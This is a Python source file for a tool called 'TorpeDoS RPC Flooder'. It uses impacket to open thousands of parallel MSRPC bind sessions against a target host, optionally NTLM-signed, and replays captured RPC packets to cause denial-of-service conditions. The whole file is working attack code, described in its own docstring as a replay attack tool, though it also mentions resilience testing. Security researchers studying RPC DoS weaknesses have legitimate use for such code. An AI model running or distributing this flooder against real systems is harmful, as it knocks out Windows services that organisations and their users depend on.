#!/usr/bin/env python3
"""
TorpeDoS RPC Flooder - Multi-threaded MSRPC Replay Attack Tool

This tool is designed to perform high-volume replay attacks against Microsoft RPC (MSRPC) services by sending pre-captured packet dumps to a target host. It supports both authenticated (NTLM) and unauthenticated sessions, allowing for flexible testing of RPC service resilience and DoS conditions.

Usage:
    python main.py target_host [options]

Options:
    -u, --username USERNAME      Username for RPC authentication (optional)
    -p, --password PASSWORD      Password for RPC authentication (optional)
    -d, --domain DOMAIN          Domain for RPC authentication (optional)
    --packets-file FILE          Path to a file containing RPC packets to replay written as textual hexstreams separated by lines (required)
    --delay-between-iterations N Delay (seconds) between iterations (default: 30)
    -c, --replay-count N         Number of parallel bind sessions to open (required)
    --iterations N               Number of times to repeat the replay (default: 1)
    -w, --worker-count N         Number of threads to use in each stage (default: 16)

Example:
    python main.py 192.168.1.10 --packets-file packets.txt -c 10000 --iterations 4
"""
import argparse
import binascii
import threading
import time
from pathlib import Path
from queue import Queue, Empty
from tqdm import tqdm
from impacket import ntlm
from impacket.dcerpc.v5 import transport, epm
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5.rpcrt import MSRPCBind, CtxItem, MSRPCHeader, MSRPC_BIND
from datetime import datetime

# -----------------------------------------------------------------------------
def parse_cli_arguments():
    """
    Parse and return command-line arguments for the TorpeDoS RPC flooder tool.

    Returns:
        argparse.Namespace: Parsed arguments with attributes for target host, authentication, packet file, concurrency, and iteration options.
    """
    parser = argparse.ArgumentParser(
        description="TorpeDoS RPC flooder"
    )
    parser.add_argument("target_host", help="RPC server address")
    parser.add_argument("-u", "--username", required=False,
                        help="Username for RPC authentication")
    parser.add_argument("-p", "--password", required=False,
                        help="Password for RPC authentication")
    parser.add_argument("-d", "--domain", required=False,
                        help="Domain for RPC authentication")
    parser.add_argument(
        "--packets-file", required=True,
        help="Path to a file containing the RPC packets to replay"
    )
    parser.add_argument(
        "--delay-between-iterations", required=False, default=30,
        help="Delay (in seconds) to wait after all the RPC calls are sent between iterations (default: 30)"
    )
    parser.add_argument(
        "-c", "--replay-count",
        type=int,
        required=True,
        help="Number of parallel bind sessions to open"
    )
    parser.add_argument(
        "--iterations",
        type=int, required=True, default=1,
        help="Number of times to repeat the replay count"
    )
    parser.add_argument(
        "-w", "--worker-count",
        type=int, default=16,
        help="Number of threads to use in each stage"
    )
    return parser.parse_args()

# -----------------------------------------------------------------------------
class CustomSigningDCERPC(transport.DCERPC_v5):
    """
    Extension of impacket's DCERPC_v5 to expose internal signing parameters for NTLM signing.
    """
    def get_sign_data(self):
        """
        Retrieve the flags, signing key, and sealing handle used for NTLM packet signing.

        Returns:
            tuple: (flags, clientSigningKey, clientSealingHandle)
        """
        return (
            self._DCERPC_v5__flags,
            self._DCERPC_v5__clientSigningKey,
            self._DCERPC_v5__clientSealingHandle
        )


# -----------------------------------------------------------------------------
def load_packet_file(file_path):
    """
    Load and parse an RPC packet dump from a .hex file, extracting interface info, authentication requirement, and packet data.

    Args:
        file_path (pathlib.Path): Path to the .hex dump file.

    Returns:
        tuple: (interface_descriptor (tuple[str, str]), requires_authentication (bool), packets (list[bytes]))

    Raises:
        ValueError: If the file lacks required UUID or VERSION headers.
    """
    interface_uuid = None
    version = None
    requires_authentication = False
    packets = []

    for line in file_path.read_text().splitlines():
        if line.startswith("# UUID:"):
            interface_uuid = line.split(":", 1)[1].strip()
        elif line.startswith("# VERSION:"):
            version = line.split(":", 1)[1].strip()
        elif line.startswith("# AUTH:"):
            requires_authentication = (
                line.split(":", 1)[1].strip().lower() == "yes"
            )
        elif line and not line.startswith("#"):
            packets.append(binascii.a2b_hex(line.strip()))

    if not interface_uuid or not version:
        raise ValueError(f"Missing UUID or VERSION header in {file_path}")

    return (interface_uuid, version), requires_authentication, packets

# -----------------------------------------------------------------------------
def resolve_rpc_port(server_ip, interface_uuid_bin):
    """
    Query the remote endpoint mapper (EPM) to resolve the TCP port for a given RPC interface UUID.

    Args:
        server_ip (str): Target host IP or name.
        interface_uuid_bin (bytes): Binary representation of the interface UUID.

    Returns:
        str or None: TCP port number as string, or None if lookup fails.
    """
    rpc_transport = transport.DCERPCTransportFactory(f"ncacn_ip_tcp:{server_ip}[135]")
    dce = rpc_transport.get_dce_rpc()
    dce.connect()
    try:
        binding_string = epm.hept_map(
            server_ip, interface_uuid_bin, protocol='ncacn_ip_tcp'
        )
        return binding_string.split("[")[1].rstrip("]")
    except Exception:
        return None
    finally:
        dce.disconnect()


def rpc_stateless_bind(dce, rpc_transport, iface_uuid):
    """
    Perform a stateless MSRPC bind to the specified interface using the provided DCE/RPC transport and context.
    Basically, it's a bind without waiting for the bind ack.

    Args:
        dce (DCERPC_v5): The DCE/RPC connection object.
        rpc_transport: The transport object for the connection.
        iface_uuid (bytes): Binary UUID of the target interface.
    """
    bind = MSRPCBind()
    ctx = dce._ctx

    # The true one :)
    item = CtxItem()
    item['AbstractSyntax'] = iface_uuid
    item['TransferSyntax'] = uuidtup_to_bin(('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0'))
    item['ContextID'] = ctx
    item['TransItems'] = 1
    bind.addCtxItem(item)

    packet = MSRPCHeader()
    packet['type'] = MSRPC_BIND
    packet['pduData'] = bind.getData()
    packet['call_id'] = 1

    rpc_transport.send(packet.get_packet())

# -----------------------------------------------------------------------------
def replay_packets_for_interface(
    server_ip, rpc_port, interface_info, packet_list,
    replay_count, worker_count, requires_authentication,
    packet_filename, username=None, password=None, domain=None
):
    """
    Orchestrate the replay of a sequence of RPC packets to a target interface, handling session setup, signing, and sending.

    Args:
        server_ip (str): RPC server address.
        rpc_port (str): Resolved RPC TCP port.
        interface_info (tuple): (uuid_str, version_str).
        packet_list (list of bytes): Packets to replay.
        replay_count (int): Number of bind sessions to open.
        worker_count (int): Number of threads per stage.
        requires_authentication (bool): Whether to apply NTLM signing.
        packet_filename (str): Original .hex file name for logging.
        username (str): Auth username, required if requires_authentication is True.
        password (str): Auth password, required if requires_authentication is True.
        domain (str): Auth domain, required if requires_authentication is True.
    """
    rpc_sessions = []  # List of (dce, transport) tuples
    signature_map = {}  # socket -> list of signature bytes

    # -- Worker functions ---------------------------------------------------------------------
    def session_establishment_worker(task_queue, progress_bar, lock):
        """
        Worker thread for establishing DCE/RPC sessions (binds) to the target interface.

        Args:
            task_queue (Queue): Queue of bind tasks.
            progress_bar (tqdm): Progress bar for visual feedback.
            lock (threading.Lock): Lock for thread-safe progress updates.
        """
        while True:
            try:
                task_queue.get_nowait()
            except Empty:
                return
            try:
                rpc_transport = transport.DCERPCTransportFactory(
                    f"ncacn_ip_tcp:{server_ip}[{rpc_port}]"
                )
                dce = CustomSigningDCERPC(rpc_transport)
                
                dce.connect()

                if requires_authentication:
                    rpc_transport.set_credentials(username, password, domain)
                    dce.set_auth_level(5)
                    dce.bind(uuidtup_to_bin(interface_info))
                else:
                    rpc_stateless_bind(dce, rpc_transport, uuidtup_to_bin(interface_info))

                rpc_sessions.append((dce, rpc_transport))
            except Exception as err:
                print(f"[bind error] {err}")
            finally:
                with lock:
                    progress_bar.update(1)
                task_queue.task_done()

    def signature_generation_worker(task_queue, progress_bar, lock):
        """
        Worker thread for generating NTLM signatures for each packet in each session.

        Args:
            task_queue (Queue): Queue of (dce, binder) session tuples.
            progress_bar (tqdm): Progress bar for visual feedback.
            lock (threading.Lock): Lock for thread-safe progress updates.
        """
        while True:
            try:
                dce, binder = task_queue.get_nowait()
            except Empty:
                return
            flags, signing_key, sealing_handle = dce.get_sign_data()
            signatures = []
            for index, packet in enumerate(packet_list):
                sig = ntlm.SIGN(
                    flags, signing_key,
                    packet[:-16], index, sealing_handle
                ).getData()
                signatures.append(sig)
            signature_map[binder.get_socket()] = signatures
            with lock:
                progress_bar.update(1)
            task_queue.task_done()

    def rpc_call_worker1(sig_map, packet_index_per_sock, task_queue, progress_bar, lock):
        """
        Worker thread for sending RPC packets one-by-one, applying signatures if required.

        Args:
            sig_map (dict): Mapping of socket to list of signatures.
            packet_index_per_sock (dict): Tracks current packet index per socket.
            task_queue (Queue): Queue of sockets to process.
            progress_bar (tqdm): Progress bar for visual feedback.
            lock (threading.Lock): Lock for thread-safe progress updates.
        """
        while True:
            try:
                sock = task_queue.get_nowait()
            except Empty:
                # if all(
                #     idx >= len(packet_list) for idx in packet_index_per_sock.values()
                # ):
                #     return
                # continue
                return
            idx = packet_index_per_sock[sock]
            if idx < len(packet_list):
                packet = packet_list[idx]
                if requires_authentication:
                    packet = packet[:-16] + sig_map[sock][idx]
                try:
                    sock.send(packet)
                    success = True
                except Exception as err:
                    print(f"[call error] {err}")
                    success = False
                with lock:
                    progress_bar.update(1)
                if success:
                    packet_index_per_sock[sock] += 1
                    if packet_index_per_sock[sock] < len(packet_list):
                        task_queue.put(sock)
                else:
                    remaining = len(packet_list) - (idx + 1)
                    with lock:
                        # Fill the progress bar with remaining packets in case of failure, since we will not retry with this socket
                        progress_bar.update(remaining)
                    packet_index_per_sock[sock] = len(packet_list)
            task_queue.task_done()

    def rpc_call_worker(sig_map, task_queue, progress_bar, lock):
        """
        Worker thread for sending all RPC packets in a single batch per socket, applying signatures if required.

        Args:
            sig_map (dict): Mapping of socket to list of signatures.
            task_queue (Queue): Queue of sockets to process.
            progress_bar (tqdm): Progress bar for visual feedback.
            lock (threading.Lock): Lock for thread-safe progress updates.
        """
        while True:
            try:
                sock = task_queue.get_nowait()
            except Empty:
                return
            current_packet_list = packet_list
            if requires_authentication:
                current_packet_list = [
                    packet[:-16] + sig_map[sock][idx]
                    for idx, packet in enumerate(packet_list)
                ]
            try:
                sock.send(b"".join(current_packet_list))
            except Exception as err:
                print(f"[call error] {err}")
            with lock:
                    progress_bar.update(1)
            task_queue.task_done()

    def start_worker_threads(count, worker_fn, args):
        """
        Launch and join a specified number of worker threads for a given worker function and arguments.

        Args:
            count (int): Number of threads to launch.
            worker_fn (callable): Worker function to execute in each thread.
            args (tuple): Arguments to pass to the worker function.
        """
        threads = [
            threading.Thread(target=worker_fn, args=args, daemon=True)
            for _ in range(count)
        ]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()

    # -- Replay stages ------------------------------------------------------------------------
    print(
        f"\n🎯 Interface={interface_info[0]}@v{interface_info[1]} "
        f"Auth={'yes' if requires_authentication else 'no'} "
        f"File={packet_filename}"
    )

    # Stage 1: Establish sessions (bind)
    bind_queue = Queue()
    bind_lock = threading.Lock()
    for _ in range(replay_count):
        bind_queue.put(None)
    bind_bar = tqdm(total=replay_count, desc="bind")
    start_worker_threads(
        worker_count,
        session_establishment_worker,
        (bind_queue, bind_bar, bind_lock)
    )
    bind_bar.close()

    # Stage 2: Generate signatures (if needed)
    if requires_authentication:
        sign_queue = Queue()
        sign_lock = threading.Lock()
        for session in rpc_sessions:
            sign_queue.put(session)
        sign_bar = tqdm(total=len(rpc_sessions), desc="sign")
        start_worker_threads(
            worker_count,
            signature_generation_worker,
            (sign_queue, sign_bar, sign_lock)
       )
        sign_bar.close()

    # Stage 3: Send RPC calls
    call_queue = Queue()
    call_lock = threading.Lock()
    for _, rpc_transport in rpc_sessions:
        sock = rpc_transport.get_socket()
        call_queue.put(sock)
    call_bar = tqdm(total=len(rpc_sessions), desc="call")
    start_worker_threads(
        worker_count,
        rpc_call_worker,
        (signature_map, call_queue, call_bar, call_lock)
    )
    call_bar.close()

    for _, rpc_transport in rpc_sessions:
        rpc_transport.disconnect()


def main():
    """
    Main entry point for the TorpeDoS RPC flooder tool. Parses arguments, loads packets, resolves ports, and orchestrates the replay attack.
    """
    args = parse_cli_arguments()
    pkt_file = Path(args.packets_file)


    interface_info, requires_auth, packets = load_packet_file(pkt_file)
    if requires_auth and not (args.username and args.password and args.domain):
        raise ValueError(
            "Authentication required but no username/password/domain provided."
        )
    rpc_port = resolve_rpc_port(
        args.target_host,
        uuidtup_to_bin(interface_info) 
    )
    if not rpc_port:
        print(f"RPC port not found for {interface_info}")

    for i in range(args.iterations):
        replay_packets_for_interface(
            server_ip=args.target_host,
            username=args.username,
            password=args.password,
            domain=args.domain,
            rpc_port=rpc_port,
            interface_info=interface_info,
            packet_list=packets,
            replay_count=args.replay_count,
            worker_count=args.worker_count,
            requires_authentication=requires_auth,
            packet_filename=pkt_file.name
        )

        if i + 1 != args.iterations:
            time.sleep(args.delay_between_iterations)

# -----------------------------------------------------------------------------
if __name__ == "__main__":
    main()
